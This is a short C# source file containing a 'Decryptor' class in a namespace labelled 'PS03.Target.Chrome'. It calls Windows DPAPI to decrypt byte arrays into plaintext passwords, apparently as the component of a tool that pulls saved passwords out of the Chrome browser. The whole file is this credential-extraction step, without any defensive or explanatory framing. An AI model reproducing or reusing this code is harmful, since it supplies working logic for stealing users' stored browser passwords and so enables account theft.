using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PS03.Target.Chrome
{
    public class Decryptor
    {
        public string decrypt(byte[] encBytes)
        {
            byte[] entropy = null;
            string description;

            var decrypted = DPAPI.Decrypt(encBytes, entropy, out description);
            var password = new UTF8Encoding(true).GetString(decrypted);

            return password;
        }
    }
}
